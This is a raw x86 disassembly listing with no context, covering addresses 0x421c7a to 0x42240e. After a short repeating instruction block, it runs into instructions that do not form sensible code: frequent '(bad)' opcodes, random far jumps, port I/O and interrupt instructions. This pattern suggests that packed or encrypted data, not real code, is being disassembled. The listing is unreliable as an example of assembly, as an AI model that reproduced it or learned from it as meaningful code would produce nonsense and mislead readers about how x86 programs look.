  421c7a:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c80:	mov    dh,0xf8
  421c82:	add    eax,DWORD PTR [ebp-0x1d]
  421c85:	pop    eax
  421c86:	cdq    
  421c87:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c8d:	mov    dh,0xf8
  421c8f:	add    eax,DWORD PTR [ebp-0x1d]
  421c92:	pop    eax
  421c93:	cdq    
  421c94:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c9a:	mov    dh,0xf8
  421c9c:	add    eax,DWORD PTR [ebp-0x1d]
  421c9f:	pop    eax
  421ca0:	cdq    
  421ca1:	sub    al,BYTE PTR [ebx-0x5f854707]
  421ca7:	mov    dh,0xf8
  421ca9:	add    eax,DWORD PTR [ebp-0x1d]
  421cac:	pop    eax
  421cad:	cdq    
  421cae:	sub    al,BYTE PTR [ebx-0x5f854707]
  421cb4:	mov    dh,0xf8
  421cb6:	add    eax,DWORD PTR [ebp-0x1d]
  421cb9:	pop    eax
  421cba:	cdq    
  421cbb:	sub    al,BYTE PTR [ebx-0x5f854707]
  421cc1:	mov    dh,0xf8
  421cc3:	add    eax,DWORD PTR [ebp-0x1d]
  421cc6:	pop    eax
  421cc7:	faddp  st(4),st
  421cc9:	mov    ecx,edi
  421ccb:	xchg   edi,eax
  421ccc:	jp     0x421c6e
  421cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ccf:	clc    
  421cd0:	add    ebp,DWORD PTR [edi+0x41]
  421cd3:	sub    al,0x4c
  421cd6:	jl     0x421cac
  421cd8:	es std 
  421cda:	lock pop ebx
  421cdc:	into   
  421cdd:	jmp    0x421d35
  421cdf:	push   edi
  421ce0:	int    0xff
  421ce2:	pop    ebx
  421ce3:	pop    es
  421ce4:	mov    ds:0xa017cbab,eax
  421ce9:	xchg   ebp,eax
  421cea:	out    0xcf,eax
  421cec:	bound  ebx,QWORD PTR [esi-0x39ecb749]
  421cf2:	or     DWORD PTR [ecx-0x11],0x4521ef07
  421cf9:	(bad)  
  421cfa:	call   DWORD PTR [ecx]
  421cfc:	jg     0x421cd0
  421cfe:	xchg   esp,eax
  421cff:	adc    DWORD PTR [eax-0x63],ecx
  421d02:	imul   ebp,esp,0xffffffb2
  421d05:	and    eax,0x3bbf03f3
  421d0a:	ins    BYTE PTR es:[edi],dx
  421d0b:	nop
  421d0c:	sbb    DWORD PTR [esi],edx
  421d0e:	inc    edi
  421d0f:	or     al,0xd4
  421d11:	(bad)  
  421d12:	enter  0xa6b7,0xaf
  421d16:	pop    edx
  421d17:	dec    esi
  421d18:	pusha  
  421d19:	mov    edx,0x6fb269da
  421d1e:	jp     0x421d9a
  421d20:	jmp    FWORD PTR ds:0x2e2d9b84
  421d26:	and    esp,DWORD PTR [edx+0x4af4fce7]
  421d2c:	dec    eax
  421d2d:	(bad)  
  421d2e:	loop   0x421d43
  421d30:	daa    
  421d31:	retf   
  421d32:	pop    es
  421d33:	pop    esi
  421d34:	lea    ebx,[ebp-0xcaa6244]
  421d3a:	and    dh,al
  421d3c:	pop    ecx
  421d3d:	dec    edx
  421d3e:	push   ebp
  421d3f:	mov    dl,0xfb
  421d41:	sahf   
  421d42:	inc    edx
  421d43:	pop    edi
  421d44:	sub    BYTE PTR [eax-0x3a],cl
  421d47:	cmp    esi,DWORD PTR [ebx+0x39]
  421d4a:	cs push 0x423e2672
  421d50:	popa   
  421d51:	mov    ah,BYTE PTR [eax]
  421d53:	inc    edx
  421d54:	into   
  421d55:	mov    ecx,DWORD PTR [ecx+0xb]
  421d58:	out    0xa3,al
  421d5a:	lock inc esp
  421d5c:	icebp  
  421d5d:	xor    eax,0x8914034
  421d62:	pop    edx
  421d63:	jno    0x421d55
  421d65:	dec    ecx
  421d66:	cmp    ebp,eax
  421d68:	push   edi
  421d69:	xchg   al,bh
  421d6b:	dec    esi
  421d6c:	cmp    BYTE PTR [eax],bh
  421d6e:	pop    es
  421d6f:	fwait
  421d70:	es scas eax,DWORD PTR es:[edi]
  421d72:	shl    DWORD PTR [edi-0x25],cl
  421d75:	dec    eax
  421d76:	mov    eax,DWORD PTR [edi]
  421d78:	paddsb mm7,QWORD PTR [eax-0x5b9540e6]
  421d7f:	dec    eax
  421d80:	mov    ds:0xb2ca57d0,eax
  421d85:	add    cl,BYTE PTR [ebp-0x5c3f9afe]
  421d8b:	mov    ah,0x75
  421d8d:	lock shr DWORD PTR ds:[ecx-0x1d5fc99d],cl
  421d95:	xor    ecx,DWORD PTR [edi+eax*4+0x6023a18f]
  421d9c:	mov    eax,ds:0xefca829c
  421da1:	es push ebx
  421da3:	aaa    
  421da4:	mov    al,cl
  421da6:	sahf   
  421da7:	sub    ah,0xae
  421daa:	repnz daa 
  421dac:	aad    0x93
  421dae:	jl     0x421d61
  421db0:	iret   
  421db1:	sbb    eax,0x635f50e1
  421db6:	cmp    eax,0xc76bed8b
  421dbb:	not    DWORD PTR [ecx]
  421dbd:	lock sub esi,ecx
  421dc0:	aas    
  421dc1:	cli    
  421dc2:	jecxz  0x421ddd
  421dc4:	repz or eax,0x7c0b82fe
  421dca:	sar    edx,0x34
  421dcd:	(bad)  
  421dce:	cli    
  421dcf:	aaa    
  421dd0:	push   ecx
  421dd1:	or     edi,DWORD PTR [ecx-0x43]
  421dd4:	fnstenv [edi-0x7b]
  421dd7:	push   ds
  421dd8:	(bad)  
  421dd9:	lea    ebp,[eax+0x218cbe6e]
  421ddf:	popa   
  421de0:	sub    sp,dx
  421de3:	jb     0x421e59
  421de5:	mov    bl,0x7a
  421de7:	mov    dl,0x26
  421dea:	xchg   ebp,eax
  421deb:	mov    bh,0x25
  421ded:	push   ss
  421dee:	adc    al,bh
  421df0:	and    ebx,DWORD PTR [edx+0x65]
  421df3:	fcomp  QWORD PTR [esi]
  421df5:	popf   
  421df6:	imul   ebx,DWORD PTR [eax-0x451e2daf],0xffffffa8
  421dfd:	sbb    bl,BYTE PTR ds:0x1cbad2cb
  421e03:	mov    dl,0x85
  421e05:	mov    eax,es
  421e07:	enter  0xaf76,0x2
  421e0b:	add    DWORD PTR [esp+ebx*8+0x40],ebp
  421e0f:	das    
  421e10:	mov    edi,0x901ff23a
  421e15:	repz dec ebx
  421e17:	out    dx,eax
  421e18:	mov    WORD PTR fs:[edi+0x2e],gs
  421e1c:	push   ss
  421e1d:	jl     0x421e0e
  421e1f:	jbe    0x421e1e
  421e21:	or     edi,esi
  421e23:	cmp    eax,DWORD PTR [ebp-0x57]
  421e26:	daa    
  421e27:	(bad)  [edx+0x361e794b]
  421e2d:	pop    ebx
  421e2e:	pop    ebx
  421e2f:	bnd jae 0x421e38
  421e32:	mov    eax,0x960b7821
  421e37:	or     esp,ecx
  421e39:	dec    esp
  421e3a:	mov    ebp,0x7f485c4a
  421e3f:	dec    ebx
  421e40:	push   0x5e421cbf
  421e45:	mov    esp,DWORD PTR [ecx-0x6a]
  421e48:	xchg   BYTE PTR [edi],dh
  421e4a:	pop    edx
  421e4b:	mov    ebp,0xe020a5c2
  421e50:	aad    0x59
  421e52:	shr    dl,1
  421e54:	rol    ch,cl
  421e56:	jo     0x421eb2
  421e58:	push   ds
  421e59:	retf   0x6743
  421e5c:	pop    ecx
  421e5d:	xchg   DWORD PTR [ecx+0x4722f2be],edx
  421e63:	fisub  DWORD PTR [edx]
  421e65:	fs xchg ecx,eax
  421e67:	imul   ecx,DWORD PTR [esp+esi*1+0x0],0xb6199a5
  421e6f:	outs   dx,DWORD PTR ds:[esi]
  421e70:	dec    ebx
  421e71:	cmp    DWORD PTR [ebx+0x6e],ecx
  421e74:	sbb    al,0xcd
  421e76:	cmp    esp,ebp
  421e78:	punpckhwd mm1,mm6
  421e7b:	outs   dx,DWORD PTR ds:[esi]
  421e7c:	scas   eax,DWORD PTR es:[edi]
  421e7d:	xchg   ch,ch
  421e7f:	sub    al,0x23
  421e81:	inc    BYTE PTR [esi]
  421e83:	or     DWORD PTR [edi+eiz*2],0xffffffd4
  421e87:	retf   0x4a9c
  421e8a:	cmc    
  421e8b:	stos   BYTE PTR es:[edi],al
  421e8c:	adc    al,BYTE PTR [ecx+0x5ff394bb]
  421e92:	dec    esp
  421e93:	leave  
  421e94:	pop    es
  421e95:	js     0x421eed
  421e97:	daa    
  421e98:	mov    eax,ecx
  421e9a:	rol    DWORD PTR [ebp+0x657199ce],cl
  421ea0:	clc    
  421ea1:	popf   
  421ea2:	test   BYTE PTR [edi],cl
  421ea4:	dec    edx
  421ea5:	loopne 0x421e91
  421ea7:	inc    edi
  421ea8:	and    ebx,ecx
  421eaa:	popf   
  421eab:	xchg   DWORD PTR [ebp+0x26],ecx
  421eae:	adc    al,BYTE PTR [edx+0x70]
  421eb1:	stos   BYTE PTR es:[edi],al
  421eb2:	dec    ebx
  421eb3:	neg    DWORD PTR [edi-0x5848187]
  421eb9:	and    BYTE PTR [edi-0x55],0xce
  421ebd:	outs   dx,DWORD PTR ds:[esi]
  421ebe:	ins    BYTE PTR es:[edi],dx
  421ebf:	dec    edx
  421ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ec1:	push   ss
  421ec2:	(bad)  
  421ec3:	aas    
  421ec4:	out    dx,eax
  421ec5:	jno    0x421f16
  421ec7:	pop    eax
  421ec8:	test   al,0x6a
  421eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ecb:	xor    BYTE PTR [ebp+esi*2+0x43362534],bh
  421ed2:	out    dx,al
  421ed3:	and    DWORD PTR [ecx+0x74],0x1e
  421ed7:	adc    eax,DWORD PTR [eax+edx*8-0x700fd25b]
  421ede:	inc    eax
  421edf:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  421ee1:	push   edi
  421ee2:	pop    edi
  421ee3:	jns    0x421f00
  421ee5:	sub    bl,BYTE PTR [edx-0x6e0c48be]
  421eeb:	push   edx
  421eec:	add    DWORD PTR [ecx+0x6c],ebp
  421eef:	and    edx,DWORD PTR [edx+0x33]
  421ef2:	repnz in eax,0xf8
  421ef5:	dec    esp
  421ef6:	cmc    
  421ef7:	push   edi
  421ef8:	retf   0xf2af
  421efb:	jg     0x421f14
  421efd:	or     al,0x95
  421eff:	inc    esp
  421f00:	mov    esp,0xe39607a5
  421f05:	sbb    edi,edi
  421f07:	test   eax,0x9412cc05
  421f0c:	retf   
  421f0d:	(bad)  
  421f0e:	mov    edi,0x373150f2
  421f13:	mov    ebp,0x5deecbeb
  421f18:	and    ah,BYTE PTR [eax+ecx*4-0xb]
  421f1c:	push   ebp
  421f1d:	inc    esp
  421f1e:	lods   al,BYTE PTR ds:[esi]
  421f1f:	xor    BYTE PTR [ebp+0x45],0x14
  421f23:	bnd jg 0x421efd
  421f26:	and    bh,BYTE PTR [eax]
  421f28:	fidivr WORD PTR ds:0x4f6c928
  421f2e:	retw   0x2a30
  421f32:	push   0xffffffde
  421f34:	clc    
  421f35:	jmp    0x6518:0x2ae8a464
  421f3c:	test   bl,cl
  421f3e:	jne    0x421eed
  421f40:	test   BYTE PTR [edi+ebx*8-0x3f],0xb3
  421f45:	adc    ch,ch
  421f47:	push   ds
  421f48:	enter  0x4be9,0x55
  421f4c:	call   0xb3109f90
  421f51:	loop   0x421f15
  421f53:	mov    fs,WORD PTR [ecx-0x31]
  421f56:	adc    bh,BYTE PTR [ecx]
  421f58:	loop   0x421f4e
  421f5a:	sub    BYTE PTR [edi],al
  421f5c:	jne    0x421fc3
  421f5e:	mov    al,0xd0
  421f60:	js     0x421fce
  421f62:	mov    DWORD PTR [esi],ebp
  421f64:	jge    0x421ef9
  421f66:	mov    DWORD PTR [esi+0x5f614654],edx
  421f6c:	les    ebx,FWORD PTR [ebx+0x39a67e56]
  421f72:	cmp    BYTE PTR [ecx+edi*8],bl
  421f75:	shl    DWORD PTR [ebx+eax*2],0xad
  421f79:	ds loopne 0x421fd9
  421f7c:	inc    ebx
  421f7d:	les    ecx,FWORD PTR [esi+eiz*4]
  421f80:	imul   edi,DWORD PTR [eax-0x7fd1f96a],0xb31412c9
  421f8a:	push   ecx
  421f8b:	sub    BYTE PTR [eax],al
  421f8d:	or     eax,0xb28122f1
  421f92:	stc    
  421f93:	sbb    BYTE PTR [edx+eiz*2+0x4],dl
  421f97:	sahf   
  421f98:	mov    bh,BYTE PTR [edx-0x50]
  421f9b:	test   al,0xce
  421f9d:	les    ebx,FWORD PTR [edx+0x25]
  421fa0:	outs   dx,DWORD PTR ds:[esi]
  421fa1:	push   cs
  421fa2:	stos   BYTE PTR es:[edi],al
  421fa3:	aas    
  421fa4:	shl    eax,1
  421fa6:	lods   eax,DWORD PTR ds:[esi]
  421fa7:	pop    edx
  421fa8:	hlt    
  421fa9:	dec    edx
  421faa:	ins    BYTE PTR es:[edi],dx
  421fab:	xor    eax,0x120d385
  421fb0:	aad    0x36
  421fb2:	push   ebp
  421fb3:	inc    esi
  421fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fb5:	aam    0x89
  421fb7:	inc    esp
  421fb8:	shl    BYTE PTR [edi+0x6d],1
  421fbb:	dec    edi
  421fbc:	lds    ebp,FWORD PTR [ebp+0x31]
  421fbf:	mov    fs,WORD PTR [edi]
  421fc1:	stos   DWORD PTR es:[edi],eax
  421fc2:	pop    ecx
  421fc3:	push   eax
  421fc4:	mov    edx,0x88a6a72
  421fc9:	or     BYTE PTR [edx],0x7d
  421fcc:	ficomp DWORD PTR [eax]
  421fce:	push   ecx
  421fcf:	jne    0x421f94
  421fd1:	ins    BYTE PTR es:[edi],dx
  421fd2:	add    DWORD PTR [esi],edx
  421fd4:	inc    eax
  421fd5:	mov    edx,0xa2a739f4
  421fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fdb:	out    dx,al
  421fdc:	iret   
  421fdd:	lds    eax,FWORD PTR [ebx]
  421fdf:	xor    eax,eax
  421fe1:	mov    edi,ebx
  421fe3:	jnp    0x421fa8
  421fe5:	push   esp
  421fe6:	neg    DWORD PTR [ecx-0x2f]
  421fe9:	mov    ah,0xb
  421feb:	je     0x422005
  421fed:	loope  0x421f82
  421fef:	jns    0x421faf
  421ff1:	lods   al,BYTE PTR ds:[esi]
  421ff2:	jp     0x421fc0
  421ff4:	xor    eax,0x5dedf0f4
  421ff9:	add    al,0xb7
  421ffb:	or     al,0x79
  421ffd:	popa   
  421ffe:	repz loop 0x42201d
  422001:	scas   eax,DWORD PTR es:[edi]
  422002:	push   cs
  422003:	loope  0x422048
  422005:	ret    
  422006:	std    
  422007:	add    edx,ebx
  422009:	cmp    bh,bh
  42200b:	adc    ch,dh
  42200d:	push   esi
  42200e:	out    dx,al
  42200f:	fsubrp st(4),st
  422011:	push   esi
  422012:	shl    BYTE PTR [esi+0x56],cl
  422015:	enter  0xd9f6,0x7b
  422019:	mov    ebx,0x1acf17f3
  42201e:	pop    ebp
  42201f:	cmp    BYTE PTR [ebx+0x32133961],ah
  422025:	in     eax,dx
  422026:	aaa    
  422027:	mov    esi,0xc2cce521
  42202c:	lods   al,BYTE PTR ds:[esi]
  42202d:	aam    0x77
  42202f:	add    DWORD PTR [eax+0x6b],ebx
  422032:	pop    ecx
  422033:	imul   esi,DWORD PTR [esi-0x64e92fff],0x59
  42203a:	out    0x12,al
  42203c:	pop    edx
  42203d:	es and al,0xf6
  422040:	cmp    edx,DWORD PTR [esi-0x9378552]
  422046:	lahf   
  422047:	mov    ebp,0x987b4b3d
  42204c:	adc    al,0x58
  42204e:	jmp    0x76a05ebe
  422053:	cmp    bh,BYTE PTR [ebp-0x27]
  422056:	rcl    DWORD PTR [ecx],0xa4
  422059:	js     0x422027
  42205b:	jle    0x4220b9
  42205d:	xlat   BYTE PTR ds:[ebx]
  42205e:	add    eax,0x763aef0f
  422063:	jnp    0x422068
  422065:	out    dx,al
  422066:	mov    dh,0xfa
  422068:	into   
  422069:	dec    edx
  42206a:	scas   eax,DWORD PTR es:[edi]
  42206b:	or     BYTE PTR [ebp+0x643cbde3],ch
  422071:	jns    0x42203c
  422073:	mov    ecx,0x1f70ecac
  422078:	fidiv  DWORD PTR [eax]
  42207a:	push   esp
  42207b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42207c:	mov    ds:0xf1abd928,al
  422081:	push   ebx
  422082:	inc    DWORD PTR [edi-0xd]
  422085:	pop    edx
  422086:	out    0x64,eax
  422088:	jnp    0x422097
  42208a:	cmp    ah,BYTE PTR [ebx-0x1248bdcc]
  422090:	mov    ecx,0x2ad49ba8
  422095:	mov    ch,0x62
  422097:	(bad)  
  422099:	or     al,0x80
  42209b:	out    0xb3,eax
  42209d:	jge    0x4220a6
  42209f:	and    esi,ecx
  4220a1:	sub    dh,bl
  4220a3:	push   ecx
  4220a4:	jl     0x42203b
  4220a6:	mov    cl,0xb0
  4220a8:	fsub   st(6),st
  4220aa:	sbb    ch,BYTE PTR [eax]
  4220ac:	jo     0x4220bd
  4220ae:	scas   eax,DWORD PTR es:[edi]
  4220af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220b0:	in     eax,0x73
  4220b2:	pop    eax
  4220b3:	or     al,0x8a
  4220b5:	add    BYTE PTR [esi-0x56aa2991],bh
  4220bb:	test   eax,0x1ab65a51
  4220c1:	inc    edi
  4220c2:	add    DWORD PTR [esi-0x8],ebx
  4220c5:	shr    DWORD PTR [edx+0x0],0xae
  4220c9:	call   0xfd6ef5b
  4220ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220cf:	dec    eax
  4220d0:	add    al,0x29
  4220d2:	pop    ebx
  4220d3:	scas   al,BYTE PTR es:[edi]
  4220d4:	add    BYTE PTR [eax+0x5f],ch
  4220d7:	lods   al,BYTE PTR ds:[esi]
  4220d8:	out    0x5d,eax
  4220da:	movlps QWORD PTR [ebp-0x6a],xmm6
  4220de:	dec    esp
  4220df:	outs   dx,DWORD PTR ds:[esi]
  4220e0:	xchg   bl,ah
  4220e2:	and    al,0xd1
  4220e4:	xchg   edx,eax
  4220e5:	mov    ebx,0x4eeca992
  4220ea:	into   
  4220eb:	repnz or DWORD PTR [ebp-0x32],esi
  4220ef:	jne    0x4220a2
  4220f1:	ja     0x422107
  4220f3:	jbe    0x4220bd
  4220f5:	mov    ah,0xc6
  4220f7:	(bad)  [edx-0x105c9d7b]
  4220fd:	ficomp DWORD PTR [esi-0x63fa4489]
  422103:	test   bl,ah
  422105:	jmp    0x8168bc7b
  42210a:	stos   BYTE PTR es:[edi],al
  42210b:	mov    dl,0x31
  42210d:	push   ss
  42210e:	fstp   TBYTE PTR [edx+0x55]
  422111:	out    0xcb,eax
  422113:	pushf  
  422114:	ficom  DWORD PTR es:[ecx-0x1f]
  422118:	ins    DWORD PTR es:[edi],dx
  422119:	jo     0x422168
  42211b:	sar    BYTE PTR [edi+0x48b5e5f2],1
  422121:	mov    edi,0x6cb928a1
  422126:	shl    DWORD PTR [ecx+ebp*1-0x4d],1
  42212a:	std    
  42212b:	pop    es
  42212c:	add    al,0x46
  42212e:	rcl    BYTE PTR [ebx-0x23dc0348],cl
  422134:	pushf  
  422135:	jnp    0x4220bc
  422137:	mov    dl,0xd6
  422139:	outs   dx,BYTE PTR ds:[esi]
  42213a:	inc    ebx
  42213b:	adc    DWORD PTR [edi-0x553ea71f],eax
  422141:	add    eax,0xfbd319ee
  422146:	cdq    
  422147:	add    DWORD PTR [edx+edi*2+0x49],0x5e474743
  42214f:	into   
  422150:	jae    0x4221a4
  422152:	sbb    eax,0x77a9fccd
  422157:	pop    edi
  422159:	lea    edi,[edx]
  42215b:	push   cs
  42215c:	jno    0x42210c
  42215e:	mov    al,0xbd
  422160:	or     DWORD PTR [edi+0x785d6402],ebp
  422166:	pop    es
  422167:	mov    esi,eax
  422169:	cmp    BYTE PTR [edi],cl
  42216b:	inc    ecx
  42216c:	sub    al,0xc2
  42216e:	addr16 nop ebp
  422172:	and    al,0xc5
  422174:	jmp    0x8a25:0x356b7e35
  42217b:	mov    dl,0xbc
  42217d:	mov    DWORD PTR [edx],esp
  42217f:	in     al,dx
  422180:	pop    edx
  422181:	test   al,0x7
  422183:	mov    esi,edi
  422185:	lahf   
  422186:	nop
  422187:	mov    ch,0x4e
  422189:	dec    edi
  42218a:	xor    DWORD PTR [edi+0x22],edi
  42218d:	mov    bh,0x5f
  42218f:	sub    eax,0xbe32f8cc
  422194:	cli    
  422195:	out    dx,al
  422196:	das    
  422197:	sbb    al,0x6c
  422199:	stos   DWORD PTR es:[edi],eax
  42219a:	mov    DWORD PTR [ebx-0x630b65c],ebx
  4221a0:	sbb    ebp,DWORD PTR [edi]
  4221a2:	adc    BYTE PTR [edi+ebp*4],0x38
  4221a6:	int3   
  4221a7:	push   ebx
  4221a8:	repnz sbb DWORD PTR [edx-0x70bd90c3],edx
  4221af:	mov    WORD PTR [ecx+0x27],?
  4221b2:	imul   esi,esp,0x87dbc88
  4221b8:	je     0x4221eb
  4221ba:	int3   
  4221bb:	jecxz  0x4221d8
  4221bd:	ror    BYTE PTR [ecx+eiz*2],1
  4221c0:	or     eax,0x774e8354
  4221c5:	aas    
  4221c6:	(bad)  
  4221c7:	fisub  WORD PTR [eax-0x17c247e8]
  4221cd:	sub    ebx,edx
  4221cf:	popf   
  4221d0:	and    ah,cl
  4221d2:	and    bh,BYTE PTR [edi-0x6e]
  4221d5:	dec    ecx
  4221d6:	jb     0x422233
  4221d8:	adc    DWORD PTR [eax-0x47dc85de],ecx
  4221de:	adc    ebp,DWORD PTR [eax]
  4221e0:	fbld   TBYTE PTR [ebx-0x3bb2a66a]
  4221e6:	dec    ebx
  4221e7:	adc    eax,0x44cd5037
  4221ec:	pop    eax
  4221ed:	jp     0x42217e
  4221ef:	fdivrp st(2),st
  4221f1:	mov    ebx,0x511a646c
  4221f6:	ins    BYTE PTR es:[edi],dx
  4221f7:	ja     0x422232
  4221f9:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4221fb:	push   0xffffffd4
  4221fd:	arpl   dx,cx
  4221ff:	jg     0x422248
  422201:	cmp    DWORD PTR [ecx],0x5a2ff850
  422207:	aad    0xd3
  422209:	gs nop
  42220b:	dec    esp
  42220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42220d:	jno    0x4221d7
  42220f:	(bad)  
  422211:	int3   
  422212:	mov    dh,0x28
  422214:	retf   0x1905
  422217:	inc    eax
  422218:	mov    dl,0x77
  42221a:	cmp    ebp,DWORD PTR [eax-0x71]
  42221d:	loop   0x4221ee
  42221f:	fstp   QWORD PTR [edx+0x43338a34]
  422225:	test   BYTE PTR [ebx-0xa],dl
  422228:	fwait
  422229:	inc    ebx
  42222a:	aad    0x36
  42222c:	jbe    0x422232
  42222e:	leave  
  42222f:	not    BYTE PTR [esi+0x4e659b14]
  422235:	pop    edx
  422236:	xor    ch,BYTE PTR [esi]
  422238:	popa   
  422239:	and    esp,eax
  42223b:	lahf   
  42223c:	mov    ebx,0x67b33d3d
  422241:	mov    fs,WORD PTR [ebp-0x4ed258ae]
  422247:	dec    ebx
  422248:	jge    0x42226d
  42224a:	ss push ebx
  42224c:	mov    WORD PTR [edi-0x24b73e91],cs
  422252:	mov    bh,0xce
  422254:	jnp    0x42222e
  422256:	ror    BYTE PTR [edi+edi*1],0x7f
  42225a:	(bad)  
  42225b:	addr16 dec ecx
  42225d:	mov    ch,0xd6
  42225f:	mov    al,0x63
  422261:	push   edx
  422262:	dec    eax
  422263:	inc    BYTE PTR [edi]
  422265:	loopne 0x4221f2
  422267:	push   edi
  422268:	sbb    ah,ah
  42226a:	lods   eax,DWORD PTR ds:[esi]
  42226b:	data16 clc 
  42226d:	push   esi
  42226e:	pop    esi
  42226f:	inc    eax
  422270:	mov    ds:0x442696d0,eax
  422275:	in     al,dx
  422276:	outs   dx,DWORD PTR ds:[esi]
  422277:	dec    ebp
  422278:	sub    ebp,DWORD PTR [edi+edi*2-0x51366bad]
  42227f:	jae    0x422264
  422281:	inc    ebx
  422282:	pop    es
  422283:	aaa    
  422284:	mov    ebx,0x33e595e8
  422289:	adc    eax,0xe05a52b8
  42228e:	inc    ebp
  422290:	xchg   edi,eax
  422291:	sbb    dh,BYTE PTR [ecx+eax*8-0x5]
  422295:	aas    
  422296:	pop    eax
  422297:	xor    al,0xaa
  422299:	lea    ebp,[ecx-0x17b8e99]
  42229f:	sub    DWORD PTR [esi-0x6030ff8b],esi
  4222a5:	cmp    ah,cl
  4222a7:	jae    0x42225e
  4222a9:	repz test al,0xe9
  4222ac:	mov    dh,0x40
  4222ae:	cmp    ch,0x53
  4222b1:	and    ecx,DWORD PTR [eax-0x326a4d60]
  4222b7:	push   es
  4222b8:	call   0x173a6cbd
  4222bd:	fist   WORD PTR [ecx+0xbc03879]
  4222c3:	pop    ebx
  4222c4:	cs inc edx
  4222c6:	pop    esi
  4222c7:	scas   eax,DWORD PTR es:[edi]
  4222c8:	or     al,BYTE PTR [ecx]
  4222ca:	arpl   WORD PTR [ebx-0x69],ax
  4222cd:	mov    eax,0x722dc575
  4222d2:	xor    eax,DWORD PTR [eax+ebp*1+0x3f986224]
  4222d9:	or     BYTE PTR [edx+0x5ed0c484],ch
  4222df:	stos   BYTE PTR es:[edi],al
  4222e0:	xor    eax,0x20d7e548
  4222e5:	fidiv  WORD PTR [ebp-0x704f0ba6]
  4222eb:	daa    
  4222ec:	pop    edi
  4222ed:	shl    BYTE PTR [edi],1
  4222ef:	iret   
  4222f0:	repnz int3 
  4222f2:	mov    bl,0x1a
  4222f4:	pushf  
  4222f5:	inc    ebp
  4222f6:	inc    ecx
  4222f7:	xchg   BYTE PTR [edi+0x3c4edd6e],ch
  4222fd:	mov    eax,0xb37b7ba0
  422302:	inc    edi
  422303:	mov    al,0xf9
  422305:	(bad)  
  422306:	cmp    DWORD PTR [edi],esp
  422308:	mov    ds:0x7514a691,eax
  42230d:	lds    eax,FWORD PTR [eax+esi*1+0x34e00088]
  422314:	jmp    0x422314
  422316:	fmulp  st(1),st
  422318:	mov    ebx,0xf4330f6f
  42231d:	push   ss
  42231e:	cld    
  42231f:	mov    esi,0x73449609
  422324:	pop    ds
  422325:	or     BYTE PTR [ebp+0x9],dl
  422328:	in     al,0xd7
  42232a:	gs jmp 0xe2d22a47
  422330:	fcomp  st(6)
  422332:	jmp    0x4222b6
  422334:	cwde   
  422335:	inc    ebx
  422336:	inc    esp
  422337:	jnp    0x4222e9
  422339:	or     al,0x2c
  42233b:	pusha  
  42233c:	repnz (bad) 
  42233e:	out    dx,al
  42233f:	push   edi
  422340:	imul   esi,DWORD PTR [edi+0x54e2614f],0xffffffb3
  422347:	fisubr DWORD PTR [esi-0x16]
  42234a:	(bad)  
  42234b:	in     eax,dx
  42234c:	adc    bh,ah
  42234e:	scas   al,BYTE PTR es:[edi]
  42234f:	fadd   st(2),st
  422351:	adc    DWORD PTR [edx],ebp
  422353:	jg     0x42231c
  422355:	push   0x925c5121
  42235a:	shr    edx,0x44
  42235d:	inc    ecx
  42235e:	and    eax,0xcc57c19a
  422363:	aam    0xfa
  422365:	lock in al,0xd6
  422368:	and    al,0xae
  42236a:	pop    ds
  42236b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42236c:	lods   eax,DWORD PTR ds:[esi]
  42236d:	mov    ds:0x4ead5bd4,al
  422372:	xor    al,0x2d
  422374:	mov    edi,0x6bb96250
  422379:	xor    cl,BYTE PTR [esi-0x345c552f]
  42237f:	or     ch,BYTE PTR [ebp+edi*2-0x16fb2920]
  422386:	icebp  
  422387:	jmp    0x4223d9
  422389:	mov    al,0x93
  42238b:	pop    edx
  42238c:	mov    DWORD PTR [bx-0x24],eax
  422390:	xlat   BYTE PTR ds:[ebx]
  422391:	rcl    BYTE PTR [ecx-0x70],1
  422394:	push   cs
  422395:	out    0x4d,eax
  422397:	inc    ebx
  422398:	out    dx,eax
  422399:	rcl    BYTE PTR [esi-0xb9a18af],1
  42239f:	xlat   BYTE PTR ds:[ebx]
  4223a0:	int3   
  4223a1:	sar    DWORD PTR ds:0x2f191683,1
  4223a7:	mov    al,0xa1
  4223a9:	mov    ds:0x8c04e19d,eax
  4223ae:	mov    WORD PTR [eax+0x659ae3e],?
  4223b4:	mov    eax,0x8c1a721f
  4223b9:	in     al,dx
  4223ba:	js     0x4223b0
  4223bc:	in     al,0x34
  4223be:	xrstor [eax]
  4223c1:	out    dx,al
  4223c2:	fist   WORD PTR [edx]
  4223c4:	mov    esi,?
  4223c6:	iret   
  4223c7:	imul   esp,ecx,0xe70ddd5e
  4223cd:	div    DWORD PTR [ecx]
  4223cf:	pop    edx
  4223d0:	test   DWORD PTR [eax],esp
  4223d2:	clc    
  4223d3:	int3   
  4223d4:	lods   al,BYTE PTR ds:[esi]
  4223d5:	(bad)  
  4223d6:	jmp    0x4f063a58
  4223db:	test   ebp,edi
  4223dd:	dec    edx
  4223de:	pop    esi
  4223df:	arpl   WORD PTR [edx+edx*2+0x3623a0b1],ax
  4223e6:	outs   dx,DWORD PTR ds:[esi]
  4223e7:	push   edx
  4223e8:	(bad)  
  4223ea:	adc    al,0x5e
  4223ec:	das    
  4223ed:	pop    esp
  4223ee:	loop   0x4223db
  4223f0:	ja     0x42246f
  4223f2:	pushf  
  4223f3:	jmp    0xdc54d866
  4223f8:	dec    ebp
  4223f9:	pop    ebp
  4223fa:	xor    DWORD PTR [ecx-0x6fe9da27],ebx
  422400:	and    al,0xd5
  422402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422403:	sub    ecx,DWORD PTR [ebx]
  422405:	cld    
  422406:	pop    esp
  422407:	leave  
  422408:	ja     0x4223f8
  42240a:	out    dx,al
  42240b:	pop    edi
  42240c:	sbb    al,0xa4
  42240e:	cmp    bh,bl
